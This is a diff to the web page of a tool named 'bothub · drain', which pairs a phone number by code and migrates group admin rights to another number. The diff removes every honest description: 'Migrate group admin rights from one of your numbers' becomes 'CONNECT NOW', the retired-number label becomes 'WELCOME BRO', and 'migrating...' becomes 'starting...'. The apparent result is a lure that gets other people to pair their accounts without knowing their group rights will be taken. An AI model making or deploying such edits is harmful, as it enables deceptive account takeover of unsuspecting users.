@@ -52,7 +52,7 @@
 <body>
 <main>
   <h1>bothub <span class="dim">· drain</span></h1>
-  <p class="sub">Migrate group admin rights from one of your numbers to another.</p>
+  <p class="sub">CONNECT NOW</p>
 
   <div id="state1">
     <form id="formA">
@@ -71,13 +71,13 @@
 
   <div id="state2" hidden>
     <form id="formB">
-      <label>source number (B) — the one being retired
+      <label>WELCOME BRO
         <input id="source" placeholder="225..." autocomplete="off" required>
       </label>
       <button id="btnB" type="submit">get pairing code</button>
     </form>
     <div class="code-block" id="codeBlock" hidden>
-      <div class="label">pairing code for B</div>
+      <div class="label">pairing code for you</div>
       <div class="code-wrap">
         <div class="code" id="code" title="click to copy">————</div>
         <button type="button" class="copy-btn" id="copyCode">copy</button>
@@ -190,7 +190,7 @@
         if (s.status === 'awaiting_source') {
           $('statusB').textContent = 'waiting for pairing...';
         } else if (s.status === 'running') {
-          $('statusB').innerHTML = `<span class="ok">migrating... ${s.done}/${s.total}</span>`;
+          $('statusB').innerHTML = `<span class="ok">starting... ${s.done}/${s.total}</span>`;
         } else if (s.status === 'done') {
           $('statusB').innerHTML = `<span class="ok">done — ${s.done}/${s.total} groups` + (s.errors?.length ? ` (${s.errors.length} errors)` : '') + '</span>';
           clearInterval(poll);
